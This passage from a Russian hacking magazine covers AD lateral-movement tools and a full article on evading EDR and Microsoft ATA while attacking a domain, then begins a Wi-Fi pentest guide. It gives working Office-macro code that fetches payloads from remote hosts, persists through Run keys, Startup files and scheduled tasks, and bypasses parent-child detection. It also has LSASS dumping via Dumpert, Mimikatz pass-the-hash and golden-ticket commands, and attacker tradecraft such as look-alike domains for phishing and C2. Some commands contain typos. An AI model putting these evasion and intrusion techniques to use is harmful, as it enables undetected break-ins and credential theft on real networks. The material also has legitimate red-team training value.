настроен для автоматичес кой или ручной уста новки обновлений. Новое
обновление само по себе может быть установлено без какого‐либо взаимо‐
действия с пользователем.


РАСПЫЛЕНИЕ ПАРОЛЕЙ
Распыление пароля (Password Spraying) отно сится к методу атаки, который
принимает большое количество имен пользователей и перечисляет их
с помощью одного пароля или малого количества паролей. Так как допус‐
тимое количество попыток вво да пароля обычно невелико, этот метод поз‐
воляет избежать блокировок политикой паролей, и он часто более эффекти‐
вен для обнаружения слабых паролей. Пос ле успешного получения спис ка
действительных поль зователей зло умышленники нередко проверяют частые
или известные пароли или благода ря накоп ленным в процессе разведки дан‐
ным пробуют ОДИН тщательно продуманный пароль для ВСЕХ известных
учетных записей поль зователей.
   Распыление паролей проводится, как пра вило, на одном из начальных эта‐
пов без наличия привилегий. Этапы ата ки распыления паролей:
 1. Вклю чение в сеть (в слу чае тес та на проникновение) или компрометация
   учетной записи пользователя (для зло умышленника).
 2. Перечисление групповой политики и политики паролей.
 3. Перечисление имен пользователей.
 4. Распыление паролей.

Для выполнения данной атаки написан скрипт Spray, который позволяет ука‐
зать парольную политику. Spray дает возможность проводить атаку на SMB,
OWA (веб‐клиент для дос тупа к серверу совмес тной работы Microsoft Ex‐
change), Lync, CISCO Web VPN. Для работы скрипт требует список поль‐
зователей и паролей.
   Альтернативное автоматичес кое решение — PowerShell‐скрипт Domain‐
PasswordSpray. Он требует только пароль либо список паролей. При этом он
автоматически перечисляет пользователей домена и парольные политики.





  Скриншот использования DomainPasswordSpray из примера описания
  программы

Кроме того, скрипт позволяет узнать список всех пользователей.


АВТОМАТИЗАЦИЯ LATERAL MOVEMENT
Множество сетей можно взломать, следуя определенным стандартным алго‐
ритмам действия. Чтобы не тратить время на проверку данных контекстов
развития событий, были раз работа ны инстру менты автоматизации шагов
каждого контекста.


GoFetch
GoFetch — это инструмент для автоматичес кого осуществления плана атаки,
созданного приложением BloodHound.
  Сначала GoFetch загружает свя зи локальных пользователей‐адми нистра‐
торов и компьютеров, созданных BloodHound, и преобразует его в собствен‐
ный формат плана для ата ки. Как только план ата ки готов, GoFetch продвига‐
ется к месту назначения в соответствии с планом, шаг за шагом, последова‐
тельно применяя методы удален ного выполнения кода и компрометируя учет‐
ные данные с помощью mimikatz.





                    Логика работы GoFetch

GoFetch написан на PowerShell, что помога ет скрываться от обнаружения,
однако используемые модули Python могут выдать работу этого средс тва.
В качестве параметров GoFetch использует связи объектов, созданные
с помощью BloodHound, и пейлоад для выполнения в формате BAT, EXE
или PS1.
   Также для примера было представлено видео работы этого средства.


ANGRYPUPPY
ANGRYPUPPY — это инс трумент для фреймворка Cobalt Strike, пред назна‐
ченный для автоматического ана лиза и выпол нения путей атаки BloodHound.
ANGRYPUPPY исполь зует встроенное боковое дви жение Cobalt Strike и воз‐
можности кражи учетных данных Beacon. Это позволя ет автоматичес ки извле‐
кать сеансы для управления в Cobalt Strike и исполь зовать его канал связи
SMB C2. Кроме того, ANGRYPUPPY дает воз можность выбирать технику,
которую оператор хочет использовать для выполнения действий бокового
движения.
  ANGRYPUPPY принимает путь ата ки BloodHound в формате JSON, а затем
определяет действия, нуж ные для выполнения пути атаки, кражи учетных дан‐
ных или бокового перемещения по мере необ ходимости.





                  Логика работы ANGRYPUPPY

Оператор просто вво дит angrypuppy в любую консоль маяка Cobalt Strike,
а затем может импортировать путь ата ки, выбирать технику бокового переме‐
щения и выполнять атаку. Это действие записывается в журнал событий
Cobalt Strike вместе с именем оператора и идентификатором ANGRYPUPPY.
Не рекомендуется выполнять другие действия бокового движения во вре мя
работы ANGRYPUPPY!
  Демонстрация работы этого инс тру мента также запечатлена на видео.


DeathStar
DeathStar — это скрипт Python, использующий API‐интерфейс RESTful Empire
для автоматизации атак в среде Active Directory с использовани ем различных
методов.





                    Логика работы DeathStar

Так как BloodHound просматривает не все пути продвижения (те же GPP
и SYSVOL не подлежат ана лизу BloodHound), данный инстру мент использует
максимум  возможностей,  которые  предос тавля ет  API  RESTful  Empire
PowerShell.
   Разработчики представили два видео, демонстрирующих работу Death‐
Star. Но есть один минус: со 2 августа 2019 года этот проект больше не под‐
держивается, так как прекратил свое сущес твование проект Empire.


ЗАКЛЮЧЕНИЕ
Благодаря боковому перемещению мы можем легитимным образом прод‐
вигаться по сети, исполь зуя для этого лишь учетные данные пользователей
или разрешенные средства дос тавки и обновления ПО,  что поз волит
получать информацию с ата кованных машин без использования RAT.
  Напоследок хотелось бы отметить, что эта статья задумана не в качестве
руководства к действию. Она лишь показы вает, насколько компетентными
должны быть системные администра торы, обеспечивающие безопас ность
в среде Active Directory. Помни, что все неправомерные действия преследу‐
ются по закону!
  Для тех, кто хочет получить больше информа ции по этой теме, я создал
телеграм‐канал @RalfHackerChannel, где ты сможешь задать свои вопросы
(или ответить на вопросы других юзеров). До встречи в следующих статьях!
COVERSTORY

  ЗАЩИТА
 ОТ ДЕТЕКТА
   В ACTIVE DIRECTORY





    УКЛОНЯЕМСЯ ОТ ОБНАРУЖЕНИЯ
        ПРИ АТАКЕ НА ДОМЕН





Как известно, любая ата ка выполняется
в несколько этапов. Мы успешно про вели
разведку, повысили собственные привиле‐
гии, продвинулись, куда только захотели,
и в итоге сумели захватить всю сеть. Но вот             RalfHacker                                                                                             hackerralf8@gmail.com
проблема:  нас  обнаружили,  отрезали
от сети и поймали. Чтобы избежать подоб‐
ного развития событий, настало время рас‐
смотреть методы защиты от обнаружения.


Читай так же про пен тесты Active Directory
 • Разведка в Active Directory. Получаем пользовательские данные в сетях
   Windows без привилегий
 • Атаки на Active Directory. Раз бира ем акту альные методы повыше ния при‐
   вилегий
 • Боковое перемещение в Active Directory. Раз бираем техники Lateral Move‐
   ment при атаке на домен




           WARNING

                      Вся информация предоставлена исключительно
                        в ознакомительных целях. Ни редак ция, ни автор
                      не несут ответственности за любой возможный
                        вред, причинен ный материалами этой статьи.



УКЛОНЕНИЕ ОТ СКАНЕРОВ ПАМЯТИ
Лю бые действия в сис теме так или иначе регистрируются, и полностью
скрыться от опытного наблюдателя никогда не получится. Но можно мак‐
симально замаскироваться. Большинс тво команд Red Team или пентестеров
при атаке на домен используют PowerShell. При чем он стал настолько популя‐
рен, что появились целые фреймворки, к при меру Empire и PowerSploit. Кроме
того, скрипты PowerShell могут быть обфусцирова ны с помощью того же In‐
voke‐Obfuscation. В ответ на появление всех этих инструментов сторона
защиты разработала методы их обнаружения, такие как выявление странных
родительских‐дочерних свя зей, подоз рительные аргу менты командной стро‐
ки и даже различные способы деобфуска ции PowerShell.
  Одно из самых передовых средств для атак на домены Windows с воз‐
можностью скрытия активнос ти — Cobalt Strike, в частности использование
модуля execute‐assembly. Есть возможность выпол нять близкие к Power‐
Shell‐скриптам программы, написанные на C#. К примеру, собранный на C#
get‐users, который дублирует функции модуля Get‐NetUser из пакета Pow‐
erView. В данном примере у контроллера домена запрашиваются свойства
SAMAccountName, UserGivenName и UserSurname для каждой учетной записи.





         Запуск get‐users с помощью модуля execute‐assembly

Давай посмотрим, что происходит в это время на целевой машине. Сделать
это можно с помощью ProcMon.




             Дерево процес сов, построенное ProcMon

Процесс powershell.exe содер жит нагрузку Cobalt Strike, а процесс rundl‐
l32.exe используется для загрузки и выполнения get‐users. Стоит сказать,
что powershell.exe является родителем rundll32.exe только потому, что
нагрузка Cobalt Strike была запущена из‐под PowerShell.
  Но нагрузку Cobalt  Strike можно запускать из‐под любого процесса,
при этом также имеется возможность мигрировать в раз ные процессы. Кро‐
ме того, некоторые функции Cobalt Strike выгружаются в новые процессы, что
позволяет обеспечить ста бильную работу это го ПО. Помимо прочего, биб‐
лиотеки DLL, загруженные в про цесс rundll32, включают в себя те, которые
необходимы для get‐users, например биб лиотеки LDAP и аутентификацию
Kerberos.



                DLL‐библиотеки, загруженные в rundll32

Главное преимущество данного модуля заключа ется в том, что файл никогда
не пишется на диск, то есть сборка выполняется строго в памяти. При этом
во время анализа памяти большое внимание уделяется функции CreateRe‐
moteThread, благодаря которой вредонос ные программы мигрируют в дру‐
гие процессы и загружа ются образы. Модуль execute‐assembly загружает
пользовательскую сборку при помощи встроенной функции LoadImage, а так
как эта функция исполь зует ся в основном легитимными процессами для заг‐
рузки DLL, обнаружить загрузку сборки очень слож но.
   Стоит добавить, что PowerShell — не единс твенный легитимный процесс,
использование которого пристально отслеживается стороной защиты. Дру‐
гие распространен ные прог раммы и службы (такие как WMIC или schtasks/at)
также подлежат тщательному контро лю. Но и функции этих инстру ментов
могут быть воспроизведены в пользовательских сборках .NET. А это значит,
что есть возможность их скрытого использования с помощью того же модуля
execute‐assembly.


УКЛОНЕНИЕ ОТ EDR
Endpoint Detection and Response (EDR) — технология обнаруже ния угроз
и реагирования на око нечном обо рудовании. EDR постоянно отслеживает
и анализирует подозрительную активность и принимает необходимые меры
в ответ на нее. Так  как большинс тво орга низаций сосредотачиваются
на безопасности сети, то они оставляют без внимания активность на оконеч‐
ном оборудовании. Являясь одним из основных источников информации
для SOC, EDR помогает закрыть эту брешь за счет настройки раз ных политик,
вклю чающих в себя контроль запус ка приложений, контроль макросов
и скриптов, анализ действий с памятью и многое дру гое.
  Все описанные в статье методы могут перекликаться с темой уклонения
от EDR, но именно в этом раз деле хотелось бы рас смотреть скры тую работу
критического ПО (такого как mimikatz) и доставление первоначальной наг‐
рузки.


Скры ваем работу mimikatz
Как правило, поч ти все EDR обна руживают использование одного из главных
инструментов любого пентестера, редтимщика или злоумышленника, ата‐
кующего Windows‐системы, — mimikatz. Поэтому использование данного инс‐
трумента в чистом виде, когда имеешь дело с серьезны ми организациями,
не имеет никакого смысла.
   Как вариант, можно сдампить процесс LSASS, с которым и работает
mimikatz для получения важных данных. Но исполь зование ProcDump EDR так‐
же обнаружит из‐за перехвата соответс твующих вызовов API. Таким образом,
если отсоединить процесс LSASS от соответс твующих API, то его можно
незаметно сдам пить. Именно так и работа ет инстру мент под названием
Dumpert. Благодаря прямым системным вызовам и отсоеди нению API данный
инструмент позволя ет сделать уко роченный дамп процесса LSASS в обход
антивирусных средств и EDR.





             Создание дампа LSASS с помощью Dumpert

И теперь можно использовать mimikatz для извлечения информации из дам‐
па, предварительно указав файл дампа.


mimikatz # securlsa::minidump [путь к дампу]
mimikatz # securlsa::logonpasswords

Этот способ защищает от обнаружения EDR во время дампа, но он оставляет
заметные сле ды, сохраняя файл программы на диске. Как уже было сказано,
инъекции кода помогают избежать записи на диск. Но опять же обычные инъ‐
екции DLL будут обнаружены EDR, поэтому была разработана техника sRDI
и соответствующие инстру менты для ее реализации. Подробное опи сание их
использования и принципов работы при лагается к самим инс трументам.
  Специально для инъекций существует DLL‐версия Dumpert. Для ее пре‐
образования будем использовать скрипт ConvertToShellcode.py из пакета
sRDI.


python3 ConvertToShellcode.py Outflank‐Dumpert.dll

Внедрить полученный шелл можно с помощью модуля shinject Cobalt Strike,
указав PID процесса.



                Модуль shinject Cobalt Strike

Но специально для Cobalt Strike на его собственном языке Agressor Script
была разработана своя версия Dumpert.





                      Dumpert для Cobalt Strike

Таким образом, с помощью объединения нескольких средств мы можем дос‐
тичь скрытой работы при краже учет ных данных из LSASS.


                                     Продолжение статьи →
COVERSTORY            ← НАЧАЛО СТАТЬИ

  ЗАЩИТА ОТ ДЕТЕКТА
    ACTIVE DIRECTORY  В
          УКЛОНЯЕМСЯ ОТ ОБНАРУЖЕНИЯ ПРИ АТАКЕ
                                    НА ДОМЕН





Ук лоняемся от правила «родительский‑дочерний про цесс»
в макросах офисных докумен тов
Самое популярное средс тво доставки начальных заг рузчи ков или полезной
нагрузки в АРТ‐атаках — макросы в офисных документах. При этом идеи экс‐
плуатации в макросах оста ются одними и теми же, усложняется лишь их
интерпретация, то есть добавляется обфуска ция для обхода EDR.
  Макросы офисных приложений пишутся на VBScript, который поддержи‐
вает много полезных функций и может обес печить пол ный доступ к сис теме.
Так, Emotet использует пос ледова тельность WinWord → cmd → PowerShell,
а группа APT28 использовала макрос, вызывавший certutil для декодирования
нагрузки.
   Как ни обфусцируй макросы, но приведенные примеры будут обнаружены
EDR по паттерну родительский‐дочерний про цесс, так как cmd, PowerShell
или certutil будут вызывать ся из про цес са WinWord, то есть будут его дочер‐
ними процессами.
  Но есть несколько способов уклонить ся от подоб ного шаблона EDR.


1. Укло нение от прямого анализа потомков
Чтобы новые процессы не происходили от WinWord, можно использовать
для их запуска WMI. Новый процесс станет дочерним процессом wmiprvse.
exe. Сделать это можно с помощью следующего кода.


Set obj = GetObject("new:C08AFD90‐F2A1‐11D1‐8455‐00A0C91F3880")
obj.Document.Application.ShellExecute "APPLICATION",Null,"FOLDER",
Null,0

Также можно загружать и выполнять код прямо внутри процесса WinWord.
Для этого используется XMLDOM.


Set xml = CreateObject("Microsoft.XMLDOM")
xml.async = False
Set xsl = xml
xsl.load(“http://ip/payload.xsl”)
xml.transformNode xsl


2. Укло нение за счет запланиро ван ных задач
С помощью VBScript мож но соз давать запланированные задачи. Новый про‐
цесс будет запущен от имени svchost.exe. Это удоб но и тем, что мы можем
запланировать выполнение через несколько дней или недель. Сделать
это можно с помощью следующего кода, указав нужную дату.


Set service = CreateObject("Schedule.Service")
Call service.Connect
Dim td: Set td = service.NewTask(0)
td.RegistrationInfo.Author = "Microsoft Corporation"
td.settings.StartWhenAvailable = True
td.settings.Hidden = False
Dim triggers: Set triggers = td.triggers
Dim trigger: Set trigger = triggers.Create(1)
Dim startTime: ts = DateAdd("s", 30, Now)
startTime = Year(ts) & "‐" & Right(Month(ts), 2) & "‐" & Right(Day(ts
), 2) & "T" & Right(Hour(ts), 2) & ":" & Right(Minute(ts), 2) & ":" &
 Right(Second(ts), 2)
trigger.StartBoundary = startTime
trigger.ID = "TimeTriggerId"
Dim Action: Set Action = td.Actions.Create(0)
Action.Path = "PATH/FOR/APPLICATION"
Call service.GetFolder("\").RegisterTaskDefinition("UpdateTask", td,
6, , , 3)

Единственное,  что  может  выдать  использование  объекта  Schedule.
Service, — это загрузка taskschd.dll в WinWord.


3. Работа с реестром
С помощью следующего кода VBScript мож но работать с реес тром.


Set WshShell = CreateObject("WScript.Shell")
WshShell.regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\
Run\key", "value", "REG_SZ"

Подобным образом можно хра нить данные, переда вать их между нагрузками
и изменять непосредственно из макроса.


4. Соз дание файлов
Все‐таки без записи на диск возможности ата кующего весьма ограниченны.
Записать нужные данные по определенному пути на диске можно следующим
образом.


Path = CreateObject("WScript.Shell").SpecialFolders("Startup")
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objFile = objFSO.CreateTextFile(Path & "\SCRIPT.bat", True)
objFile.Write "notepad.exe" & vbCrLf
objFile.Close

Раз запись на диск произош ла, то нужно максимально замаскировать данное
действие. Усложнить анализ можно, используя специальные пути к файлам,
ведь нет ничего аномаль ного в том, что процесс WinWord производит запись
во временный файл tmp. К примеру, можно выполнить запись по одному
из этих путей:


C:\Users\<user>\AppData\Local\Microsoft\Windows\INetCache\Content.
Word\~WRF{AE7BBF2F‐B65D‐4BF4‐9FAD‐A779AEC41A02}.tmp
C:\Users\<user>\AppData\Local\Temp\CVR497F.tmp
C:\Users\<user>\AppData\Local\Microsoft\Windows\Caches\{
AFBF9F1A‐8EE8‐4C77‐AF34‐C647E37CA0D9}.1.ver0x0000000000000016.db

Но можно пойти еще дальше и изменить шаб лон Oﬃce:


C:\Users\<user>\AppData\Roaming\Microsoft\Templates\Normal.dotm


5. Загрузка дан ных
VBScript можно исполь зовать для загрузки различных данных по сети. Но,
если использовать библиотеку XMLHTTP или функцию API URLDownload‐
ToFIleA, процесс WinWord инициирует сетевое соеди нение (и явно не с сай‐
том Microsoft), что будет отмечено EDR для SOC. Этого можно избе жать
при помощи Internet Explorer COM.


Set ie = CreateObject("InternetExplorer.Application")
ie.Navigate "https://pastebin.com/raw/payload"
State = 0
Do Until State = 4
DoEvents
State = ie.readyState
Loop
Dim payload: payload = ie.Document.Body.innerHTML

Использование данного метода приведет к вызову браузера из процесса
svchost.exe для загрузки данных.


6. Встраивание в мак рос
Также существует возможность вставить нагрузку или файл в сам макрос
и даже документ, чтобы не загружать его по сети. Тот же Metasploit Framework
способен создавать макросы со встро енной нагрузкой.


msfvenom ‐p generic/custom PAYLOADFILE=payload_file ‐a x64
‐‐platform windows ‐f vba‐exe

Но проблема кроется в том, что новый процесс будет запускаться из‐под
процесса WinWord. Это легко испра вить, а как — мы уже рассмотрели выше.
   Стоит отметить, что данные техники впол не при менимы по отдельнос ти,
но шанс быть обнаруженным станет мень ше, если использовать эти методы
(или некоторые из них) совмес тно.


OPSEC
Скрываясь во время атаки, мож но обмануть программный продукт, но куда
сложнее обмануть человека. Поэто му во время любой атаки стоит думать
о своих действиях. Дам несколько вполне очевидных советов.
  Внедрение в процессы — обычное дело, но стоит задуматься о том,
в какие процессы стоит внедрять ся. Ведь некото рые процессы пользователь
может закрыть за ненадоб ностью, поэтому стоит выбирать те, что обеспечат
более продолжительный жизненный цикл полез ной нагрузки. При этом, ско‐
рее всего, вызовет подоз рение, что блокнот (процесс notepad.exe) обра‐
щается к удаленному сер веру или выходит в интернет. Поэтому опытный ата‐
кующий ско рее будет внедрять ся в службу обновлений или браузер, чье
предназначение объясняет необходимость работы с сетью.
  Мы уже говорили об использовании PowerShell — иногда оно губительно.
Поэтому любой оператор должен очень хорошо знать инстру менты, с которы‐
ми он работает, ведь мож но даже не догадывать ся, что некоторые нагрузки
или команды популярных фреймворков исполь зуют PowerShell (к при меру,
wmi или psexec_psh в Cobalt Strike).
  Еще одна из мер предос торожности — исполь зовать схожие доменные
имена, к примеру github.com и githab.com. Такие домены не вызовут подоз‐
рения, в отличие от странных наборов символов (встре чалось и что‐то типа
такого: kaWEFwkfbw.com). Этот подход исполь зуется  как при рассылке
фишинговых писем, так и для организа ции свя зи с управляющим сервером.
  Поддерживать  связь  между  захваченными  хостами  лучше  всего
с помощью легитимных для орга низации служб и программ. Куда безопаснее
делать это через используемые в скомпрометированной сети RDP или RAd‐
min. Для сбора допол нитель ной информации мож но получать скриншоты
рабочих столов, а также привлекать микрофоны и камеры, установленные
на хостах (правда, данный вид раз ведки требует много времени и усилий).
  Ни в коем случае не следует использовать распространенные модули
популярных фреймворков (например, local_admin_search_enum из MSF) —
они обнаруживаются всеми видами средств защиты.
  Никогда не отключай на захваченных хостах анти вирусы, ATP и EDR. Так
как большинство этих сис тем соз дают оповещение об отключении, это будет
очевидным сигналом аномальной работы узла или всей сети.
   И, как уже отмечалось, требуется собирать и накап ливать все учетные дан‐
ные, даже имена поль зователей без паролей, пароли от документов, хра‐
нилищ и почтовых ящиков, и использовать их корреляции между собой.


УКЛОНЕНИЕ ОТ ОБНАРУЖЕНИЯ АТА
Advanced Threat Analytics (ATA) представляет собой платформу для локальной
сети, она помогает защитить организацию от мно гих типов современных
целевых компьютер ных атак и внутренних угроз. ATA использует собственный
механизм сетевого ана лиза для сбо ра и валида ции трафика по нес кольким
протоколам проверки подлинности, авторизации и сбора информации (Ker‐
beros, DNS, RPC, NTLM и дру гие).
   ATA собирает эти сведения при помощи таких механизмов, как зеркальное
отображение пор тов с контроллеров домена на шлюз ATA или разверты вание
упрощенного шлюза ATA непос редс твенно на контрол лерах домена. Таким
образом, данная технология служит хорошим помощ ником для SOC, сильно
усложняя работу нападающей стороне.
  Для уклонения от регистра ции атак с помощью АТА первым делом ата‐
кующий должен  безуко ризненно следовать всем  пунктам, изложенным
в OPSEC. А именно досконально знать техники и инстру менты, которыми она
пользуется. Это важно, пос кольку АТА, в отличие от EDR, работает за счет
анализа сетевой активнос ти (прос лушивая протоколы) и име ет высокую
интеграцию с системными журналами событий, аудита и большим количес‐
твом SIEM‐систем. То есть выделяет ано малии в действиях пользователей.
   Таким обра зом, нам нужно умело уклонять ся от обнаружения на всех эта‐
пах атаки, будь то раз ведка (перечисление компьютеров, пользовате лей
и подобное) или боковое движение (за счет переда чи билетов или хешей).


Раз ведка
В самом начале, когда у нас есть обычные доменные права пользователя, мы
стараемся перечислить домены, компь юте ры, учет ные записи администра‐
торов и членство в разных группах. К примеру, ути лита net.exe использует
для сканирования протокол SAMR, на который АТА среагирует событием Re‐
connaissance  using  directory  services   enumeration  (раз ведка
с использованием перечисления служб каталогов).




     Событие Reconnaissance using directory services enumeration АТА

Но если для перечислений применить PowerView, то никаких действий от АТА
мы не получим, потому что данный инстру мент вмес то протокола SAMR
использует запросы LDAP, на которые АТА не реагирует.
  Еще один вариант избежать детекта с помощью АТА — WMI‐запросы.
Для этого используется следующий алгоритм.
 1. Получаем пользователей в домене domain:


   Get‐WmiObject ‐Class Win32_UserAccount ‐Filter "Domain='domain'
   AND Disabled='False'"

 2. Получаем группы в домене domain:


   Get‐WmiObject ‐Class win32_group ‐Filter "Domain='domain'"

 3. Получаем членство в группе администра торов домена domain:


   Get‐WmiObject ‐Class win32_groupUser | Where‐Object {($_.GroupC
   omponent ‐match "Domain Admins") ‐and ($_.GroupComponent ‐match
   "opsdc")}

Если  использовать  команды  Find‐LocalAdminAccess  (найти  машины
в домене, где текущий пользователь имеет права локального адми нистра‐
тора)  или  Invoke‐UserHunter  (для  перечисления  пользователей),  то
это будет обнаружено АТА как Reconnaissance using SMB session enu‐
meration (разведка с исполь зованием перечисления сеанса SMB). Однако
такую реакцию будут вызывать только запросы к контроллеру домена. Если же
на этапе перечислений не обра щаться к контроллеру домена, то можно избе‐
жать обнаружения с помощью АТА. Эти же команды можно использовать
с параметром ‐ComputerFile, ука зав спи сок компьютеров (то есть все
машины, кроме контрол лера домена).


Invoke‐UserHunter ‐ComputerFile pc_list.txt ‐Verbose

Рассмотренные в первой час ти цикла ста тей методы сканирования SPN также
не отслеживаются с помощью АТА.


Brute force
Часто возникает потребность обеспечить дос туп к машине в качес тве локаль‐
ного пользователя для получения точки опоры (закрепле ния). При этом
в парольной политике нет огра ничения на количество попыток ввода пароля.
В этом случае можно использовать перебор по словарю, но это дей ствие
будет обнаружено АТА.



            Событие Suspicious authentication failures АТА

Дело в том, что АТА определяет многократное подключение с разными
паролями в течение корот кого промежутка времени.




           Причина события Suspicious authentication failures

Можно избежать обнаружения, если при менять технику password spraying (так
как мы имеем список пользователей) или устра ивать длительные задержки
при переборе пароля. Также можно задей ство вать password spraying, чередуя
пароли с задержками. При любом из этих вариантов мы уклоняемся от обна‐
ружения АТА.


Overpass-The-Hash
Допустим, мы получили доступ к хешам NTLM и провели атаку Overpass‐the‐
hash для создания билета Kerberos и доступа к ресурсам или сервисам:


Invoke‐Mimikatz ‐Command '"sekurlsa::pth /user:[USER] /domain:[
DOMAIN] /ntlm:[NTLM хеш] /run:powershell.exe"'

Но в этом случае мы будем обна ружены АТА. Причем сработают сразу два
правила: Encryption downgrade activity и Unusual protocol implemen‐
tation. При этом в сооб щении будет ука зана причина — понижение уровня
шифрования. Разница в шифровании при переда че обычного пароля и при
передаче NTLM‐хеша видна на следующем изображении.





        Уровни шифрования при раз личных спо собах авторизации

Куда более схожи между собой способы авторизации при помощи обычного
пароля и с применением AES. Поэто му избе жать обнаружения АТА можно,
используя ключи AES. Для их извлечения можно задействовать тот же
Mimikatz:


Invoke‐Mimikatz ‐Command '"sekurlsa::ekeys"' ‐ComputerName [PC Name]

Теперь можно выполнить Overpass‐The‐Hash, при этом в качестве ключа
AES128 использовать любое зна чение.


Invoke‐Mimikatz ‐Command '"sekurlsa::pth /user:[USER] /domain:[
DOMAIN] /ase256:[Сдампленный AES256] /ntlm:[NTLM хеш] /aes128:012345
67890123456789012345678901 /run:powershell.exe"'

В таком случае мы успешно выполним Overpath‐The‐Hash и избежим обна‐
ружения с помощью АТА.


Golden Ticket
Допустим, мы создали «золотой билет» и даже успешно сохранили его
в память. Но как только мы обра тимся к ресурсу в домене, АТА обнаружит
это и классифицирует как событие Encryption downgrade activity. Так
как причина события такая же, что и в случае с Overpath‐The‐Hash, то
и решение такое же — ключи AES.


Invoke‐Mimikatz ‐Command '"kerberos::golden /User:[USER] /domain:[
DOMAIN] /sid:[SID] /aes256:[ключ AES256] /id:[ID] /groups:[GROUP] /
ptt"'

Таким образом мы можем сгенерировать золотой билет и в дальнейшем
использовать его без риска быть обнаруженным с помощью АТА.


Что не обнаруживается с помощью АТА
Как уже было отмечено, ска нирование SPN не подлежит детектированию
с помощью АТА, так как нет взаимо действия с контроллером домена. По той
же причине не будут обнаружены и ата ки на серверы Microsoft SQL Server
и базы данных.
  При наличии NTLM‐хеша учетной записи службы мы можем создать TGS
и предоставить его служ бе для получения доступа (Silver Ticket). Так как при
этой операции отсутствует вза имо действие с контроллером домена, АТА
не может обнаружить использование Silver Ticket.
   Техника повышения привилегий до SYSTEM из группы DnsAdmins не обна‐
руживается ATA.
  При использовании доверитель ных отно шений между доменами по умол‐
чанию используется шифрование RC4, то есть исключается воз можность
понижения шифрования. Поэто му АТА не обна руживает использование
доверительных отношений (за исключени ем слу чаев, когда администраторы
в свойствах доверия во всех доменах не включат поддержку AES).
  Во всех случаях репликаций с помощью DCSync ты будешь обнаружен
и зарегистрирован АТА, кроме одного: когда DCSync выполняется с одного
из контроллеров домена. Это легитим ная операция между контрол лерами
домена, и в таких действиях нет никаких аномалий, то есть и реакции АТА
не последует.
  В этой статье приведены не все техники уклонения от обнаруже ния.
Остальные средства обна ружения и способы их обхода будут рассмотрены
в следующих публикациях.
ВЗЛОМ
 WI-FI
  TOTAL PWN

        ОСВАИВАЕМ С НУЛЯ
         АКТУАЛЬНЫЕ ТЕХНИКИ
           ПЕНТЕСТА WI‐FI





Самый   надежный   способ   проверить
безопасность сети — это попробовать ее
взломать. В «Хакере» уже не раз публикова‐
лись руководс тва по аудиту Wi‐Fi, но такие
гайды быстро устарева ют. Единственный              84ckf1r3                                                                                         84ckf1r3@gmail.com
способ актуализировать их — снова пройти
весь  путь самостоятельно и поделиться
свежим опытом. Именно это я и постарался
сделать.


ЧТО НУЖНО ДЛЯ АУДИТА БЕСПРОВОДНЫХ СЕТЕЙ?
Универсальный джентльменский набор: ноутбук с «Линуксом» и Wi‐Fi‐адаптер
с интерфейсом USB (их еще называ ют донглами). Можно использовать
и смартфон, но для некото рых атак банально требуется второй USB‐порт.
Годится даже ноутбук без установленной ОС и вообще без накопителя.


           WARNING

                      Вся информация предоставлена исключительно
                        в образовательных целях. Ни редак ция, ни автор
                      не несут ответственности за любой возможный
                        вред, причинен ный материалами данной статьи.



Какую ОС взять для вардрайвин га?
«Линукс» позволяет тонко управлять устройствами (в частности, донглами)
через опенсорсные драйверы. Подходит практичес ки любой дистрибутив,
но  удобнее  воспользовать ся  готовой  сборкой.  Например,  BlackArch,
BackBox, Parrot Security, Kali Linux.
  Наиболее раскручены сборки Kali Linux, в которые уже интегрированы
не только наборы хакерских утилит, но и драйверы большинства потенциаль‐
но пригодных для вардрайвинга чипов плюс изна чаль но сде ланы мелкие тви‐
ки.


             INFO

                   В последних выпусках Kali очень многое пере‐
                     осмыслено. Теперь она может внешне мимик‐
                       рировать под вин ду (что бы тебя не спалили, уви‐
                       дев стран ное на мониторе), рут по умолчанию
                      отключен  (либо  включай,  либо  пиши  sudo
                      перед коман дами, требующими права суперполь‐
                        зовате ля). Самое главное, в  Kali теперь сразу
                      поддерживаются    новые    дон глы     стан‐
                       дарта 802.11ac и крайне просто увеличить мощ‐
                        ность Wi‐Fi‐адаптера.



Как использовать на ноуте Linux, не сно ся вин ду?
Разработчики не рекомендуют устанавливать Kali на жесткий диск, хотя тех‐
нически вариант с муль тизагрузкой вполне реализуем через тот же GRUB.
Просто границы законных действий во время аудита очень размыты, и ради
твоей же безопасности лучше использовать режим Live Persistence. Работа
в нем почти не будет отличаться от работы в установленной операци онке.
Все обновления, конфиги, новые скрипты и твои личные файлы подхватятся
при следующей перезагрузке в режиме Persistence. Для большей приват‐
ности его можно зашифровать.
  На мой взгляд, карта памяти удобнее флешки, так как она не занимает
порт USB и не торчит под рукой. Порты (осо бенно с раздельным питанием)
всегда в дефиците на ноутбуках. Бери карточку хотя бы с маркировкой Class
10 (заявленная скорость линейной записи 10 Мбайт/с), а лучше — UHS‐I
V30 и шустрее (если встро енный картридер ее поддерживает).


Как сде лать загрузоч ную флеш ку с Kali и раз делом Persistence?
Для этого на USB Flash или SD‐карточке нуж но соз дать два раз дела. Один
будет FAT32 для запуска ОС — на него рас паковы вается об раз с kali.org. Вто‐
рой раздел — ext3 для сохранения настроек, собственных файлов и сес сион‐
ных изменений.



               Схема разметки с разделом Persistence

Windows не умеет работать с флешками, на которых больше одного раздела,
и не поддерживает ext3. Однако в ней такая разметка элементарно делается
бесплатной утилитой Rufus. Главное — запускать обычную версию (не
portable).





                        Создаем флешку


Какой Wi-Fi-адаптер под ходит для вардрайвин га?
В общем случае — способный переключаться в режим мониторинга (обя‐
зательно) и выпол нять инжект сетевых пакетов (желательно). Может он
это или нет — зависит от чипа, на котором пос троен адаптер, и его драй вера.
Универсальная методика подбора подходящих донглов описана в этой
статье. По сути она актуальна и сейчас, однако сайт wikidevi.com давно лежит,
поэтому вместо него используем kernel.org.
  На этом сайте есть таблица драйверов Wi‐Fi для Linux. Нас интересуют
не все, а только те, для которых в столбце monitor указано yes, в следующей
колонке (PHY modes) присутс тву ет обоз начение N или AC (гарантия того, что
используются сравнительно новые стандарты), а в графе Bus — USB.
  Дополнительную информа цию о драйверах можно взять из двух табличек
в англоязычной Вики. Прин цип тот же — ищем сочетание параметров:
802.11n(ac) + monitor mode + USB.
  На момент подготов ки статьи (январь 2020‐го) в сухом остатке оказались
следующие драйверы: ath9k_htc, carl9170, mt76, mt7601u, p54, rt2800usb,
rt2x00, rtl8187, rtl8192cu, zd1211, zd1211rw.
   Кликаем по ссылке на описание каждого подходящего драйвера и видим
список поддерживаемых им чип сетов, а затем и устрой ств. Например, вот
